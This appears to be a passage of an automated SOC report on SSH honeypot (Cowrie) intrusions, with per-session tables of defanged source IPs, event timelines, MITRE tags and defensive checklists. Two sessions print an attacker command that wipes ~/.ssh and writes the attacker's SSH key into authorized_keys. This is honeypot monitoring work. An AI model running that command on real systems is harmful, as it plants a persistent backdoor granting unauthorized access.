| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:40:49` | `cowrie.session.connect` |
| `2026-08-24 09:40:49` | `cowrie.client.version` |
| `2026-08-24 09:40:49` | `cowrie.client.kex` |
| `2026-08-24 09:40:50` | `cowrie.login.success` |
| `2026-08-24 09:40:51` | `cowrie.session.params` |
| `2026-08-24 09:40:51` | `cowrie.command.input` |
| `2026-08-24 09:40:51` | `cowrie.command.failed` |
| `2026-08-24 09:40:51` | `cowrie.log.closed` |
| `2026-08-24 09:40:52` | `cowrie.session.params` |
| `2026-08-24 09:40:52` | `cowrie.command.input` |
| `2026-08-24 09:40:53` | `cowrie.session.file_download` |
| `2026-08-24 09:40:53` | `cowrie.log.closed` |
| `2026-08-24 09:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe48f997f08

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-08-24 09:40 |
| **Last Seen** | 2026-08-24 09:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:40:53` | `cowrie.session.connect` |
| `2026-08-24 09:40:53` | `cowrie.client.version` |
| `2026-08-24 09:40:53` | `cowrie.client.kex` |
| `2026-08-24 09:40:54` | `cowrie.login.success` |
| `2026-08-24 09:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2cdac63965

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-08-24 09:40 |
| **Last Seen** | 2026-08-24 09:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:40:54` | `cowrie.session.connect` |
| `2026-08-24 09:40:54` | `cowrie.client.version` |
| `2026-08-24 09:40:55` | `cowrie.client.kex` |
| `2026-08-24 09:40:56` | `cowrie.login.success` |
| `2026-08-24 09:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79c75cea083

| Field | Detail |
|---|---|
| **Source IP** | `122.160.187[.]31` |
| **First Seen** | 2026-08-24 09:43 |
| **Last Seen** | 2026-08-24 09:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:43:07` | `cowrie.session.connect` |
| `2026-08-24 09:43:08` | `cowrie.client.version` |
| `2026-08-24 09:43:08` | `cowrie.client.kex` |
| `2026-08-24 09:43:10` | `cowrie.login.success` |
| `2026-08-24 09:43:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.187[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.187[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db54497f0e4

| Field | Detail |
|---|---|
| **Source IP** | `43.162.90[.]45` |
| **First Seen** | 2026-08-24 09:43 |
| **Last Seen** | 2026-08-24 09:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:43:16` | `cowrie.session.connect` |
| `2026-08-24 09:43:16` | `cowrie.client.version` |
| `2026-08-24 09:43:16` | `cowrie.client.kex` |
| `2026-08-24 09:43:18` | `cowrie.login.success` |
| `2026-08-24 09:43:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.162.90[.]45` to AbuseIPDB if not already reported
- [ ] Block `43.162.90[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb7b80c4377

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-08-24 09:46 |
| **Last Seen** | 2026-08-24 09:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:46:35` | `cowrie.session.connect` |
| `2026-08-24 09:46:35` | `cowrie.client.version` |
| `2026-08-24 09:46:35` | `cowrie.client.kex` |
| `2026-08-24 09:46:37` | `cowrie.login.success` |
| `2026-08-24 09:46:38` | `cowrie.session.params` |
| `2026-08-24 09:46:38` | `cowrie.command.input` |
| `2026-08-24 09:46:38` | `cowrie.command.failed` |
| `2026-08-24 09:46:38` | `cowrie.log.closed` |
| `2026-08-24 09:46:39` | `cowrie.session.params` |
| `2026-08-24 09:46:39` | `cowrie.command.input` |
| `2026-08-24 09:46:39` | `cowrie.session.file_download` |
| `2026-08-24 09:46:39` | `cowrie.log.closed` |
| `2026-08-24 09:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16b277b742bb

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-08-24 09:46 |
| **Last Seen** | 2026-08-24 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:46:40` | `cowrie.session.connect` |
| `2026-08-24 09:46:40` | `cowrie.client.version` |
| `2026-08-24 09:46:40` | `cowrie.client.kex` |
| `2026-08-24 09:46:41` | `cowrie.login.success` |
| `2026-08-24 09:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a10b36c7077

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-08-24 09:46 |
| **Last Seen** | 2026-08-24 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:46:42` | `cowrie.session.connect` |
| `2026-08-24 09:46:42` | `cowrie.client.version` |
| `2026-08-24 09:46:42` | `cowrie.client.kex` |
| `2026-08-24 09:46:43` | `cowrie.login.success` |
| `2026-08-24 09:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1551f45214

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:47 |
| **Last Seen** | 2026-08-24 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:47:25` | `cowrie.session.connect` |
| `2026-08-24 09:47:25` | `cowrie.client.version` |
| `2026-08-24 09:47:26` | `cowrie.client.kex` |
| `2026-08-24 09:47:27` | `cowrie.login.success` |
| `2026-08-24 09:47:27` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:47:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:47:27` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6a560d93d8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:47 |
| **Last Seen** | 2026-08-24 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:47:29` | `cowrie.session.connect` |
| `2026-08-24 09:47:29` | `cowrie.client.version` |
| `2026-08-24 09:47:29` | `cowrie.client.kex` |
| `2026-08-24 09:47:30` | `cowrie.login.success` |
| `2026-08-24 09:47:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:47:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:47:30` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef39d23cafa0

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-24 09:47 |
| **Last Seen** | 2026-08-24 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:47:29` | `cowrie.session.connect` |
| `2026-08-24 09:47:30` | `cowrie.client.version` |
| `2026-08-24 09:47:30` | `cowrie.client.kex` |
| `2026-08-24 09:47:32` | `cowrie.login.success` |
| `2026-08-24 09:47:33` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037dd39d895d

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-08-24 09:47 |
| **Last Seen** | 2026-08-24 09:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:47:38` | `cowrie.session.connect` |
| `2026-08-24 09:47:39` | `cowrie.client.version` |
| `2026-08-24 09:47:39` | `cowrie.client.kex` |
| `2026-08-24 09:47:41` | `cowrie.login.success` |
| `2026-08-24 09:47:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852385edb732

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-24 09:47 |
| **Last Seen** | 2026-08-24 09:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:47:46` | `cowrie.session.connect` |
| `2026-08-24 09:47:46` | `cowrie.client.version` |
| `2026-08-24 09:47:46` | `cowrie.client.kex` |
| `2026-08-24 09:47:47` | `cowrie.login.success` |
| `2026-08-24 09:47:47` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9d84303a2a4

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-08-24 09:47 |
| **Last Seen** | 2026-08-24 09:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:47:52` | `cowrie.session.connect` |
| `2026-08-24 09:47:53` | `cowrie.client.version` |
| `2026-08-24 09:47:53` | `cowrie.client.kex` |
| `2026-08-24 09:47:54` | `cowrie.login.success` |
| `2026-08-24 09:47:54` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc5bec1221b

| Field | Detail |
|---|---|
| **Source IP** | `71.236.99[.]31` |
| **First Seen** | 2026-08-24 09:51 |
| **Last Seen** | 2026-08-24 09:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:51:43` | `cowrie.session.connect` |
| `2026-08-24 09:51:43` | `cowrie.client.version` |
| `2026-08-24 09:51:43` | `cowrie.client.kex` |
| `2026-08-24 09:51:44` | `cowrie.login.success` |
| `2026-08-24 09:51:45` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.236.99[.]31` to AbuseIPDB if not already reported
- [ ] Block `71.236.99[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab132bb37521

| Field | Detail |
|---|---|
| **Source IP** | `213.59.165[.]109` |
| **First Seen** | 2026-08-24 09:51 |
| **Last Seen** | 2026-08-24 09:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:51:52` | `cowrie.session.connect` |
| `2026-08-24 09:51:54` | `cowrie.client.version` |
| `2026-08-24 09:51:54` | `cowrie.client.kex` |
| `2026-08-24 09:51:57` | `cowrie.login.success` |
| `2026-08-24 09:52:01` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.59.165[.]109` to AbuseIPDB if not already reported
- [ ] Block `213.59.165[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94dc60c405e2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:56 |
| **Last Seen** | 2026-08-24 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:56:48` | `cowrie.session.connect` |
| `2026-08-24 09:56:48` | `cowrie.client.version` |
| `2026-08-24 09:56:48` | `cowrie.client.kex` |
| `2026-08-24 09:56:49` | `cowrie.login.success` |
| `2026-08-24 09:56:50` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:56:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:56:50` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ab9f13e41f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:56 |
| **Last Seen** | 2026-08-24 09:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:56:53` | `cowrie.session.connect` |
| `2026-08-24 09:56:54` | `cowrie.client.version` |
| `2026-08-24 09:56:54` | `cowrie.client.kex` |
| `2026-08-24 09:56:55` | `cowrie.login.success` |
| `2026-08-24 09:56:55` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:56:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:56:56` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5dd8b7e5e55

| Field | Detail |
|---|---|
| **Source IP** | `101.132.156[.]251` |
| **First Seen** | 2026-08-24 10:05 |
| **Last Seen** | 2026-08-24 10:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:05:51` | `cowrie.session.connect` |
| `2026-08-24 10:05:51` | `cowrie.client.version` |
| `2026-08-24 10:05:51` | `cowrie.client.kex` |
| `2026-08-24 10:05:54` | `cowrie.login.success` |
| `2026-08-24 10:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.132.156[.]251` to AbuseIPDB if not already reported
- [ ] Block `101.132.156[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e6d31fa292

| Field | Detail |
|---|---|
| **Source IP** | `101.132.156[.]251` |
| **First Seen** | 2026-08-24 10:05 |
| **Last Seen** | 2026-08-24 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:05:55` | `cowrie.session.connect` |
| `2026-08-24 10:05:55` | `cowrie.client.version` |
| `2026-08-24 10:05:55` | `cowrie.client.kex` |
| `2026-08-24 10:05:56` | `cowrie.login.success` |
| `2026-08-24 10:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.132.156[.]251` to AbuseIPDB if not already reported
- [ ] Block `101.132.156[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b69625c26da

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:06 |
| **Last Seen** | 2026-08-24 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:06:34` | `cowrie.session.connect` |
| `2026-08-24 10:06:34` | `cowrie.client.version` |
| `2026-08-24 10:06:34` | `cowrie.client.kex` |
| `2026-08-24 10:06:36` | `cowrie.login.success` |
| `2026-08-24 10:06:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:06:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:06:36` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfbfe255ac9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 10:06 |
| **Last Seen** | 2026-08-24 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:06:39` | `cowrie.session.connect` |
| `2026-08-24 10:06:39` | `cowrie.client.version` |
| `2026-08-24 10:06:40` | `cowrie.client.kex` |
| `2026-08-24 10:06:40` | `cowrie.login.success` |
| `2026-08-24 10:06:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:06:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 10:06:41` | `cowrie.direct-tcpip.data` |
| `2026-08-24 10:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd3deaa3564

| Field | Detail |
|---|---|
| **Source IP** | `73.43.184[.]216` |
| **First Seen** | 2026-08-24 10:06 |
| **Last Seen** | 2026-08-24 10:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:06:55` | `cowrie.session.connect` |
| `2026-08-24 10:06:56` | `cowrie.client.version` |
| `2026-08-24 10:06:56` | `cowrie.client.kex` |
| `2026-08-24 10:06:57` | `cowrie.login.success` |
| `2026-08-24 10:06:57` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.43.184[.]216` to AbuseIPDB if not already reported
- [ ] Block `73.43.184[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e37b3367a1f

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-24 10:07 |
| **Last Seen** | 2026-08-24 10:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:07:03` | `cowrie.session.connect` |
| `2026-08-24 10:07:03` | `cowrie.client.version` |
| `2026-08-24 10:07:03` | `cowrie.client.kex` |
| `2026-08-24 10:07:05` | `cowrie.login.success` |
| `2026-08-24 10:07:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

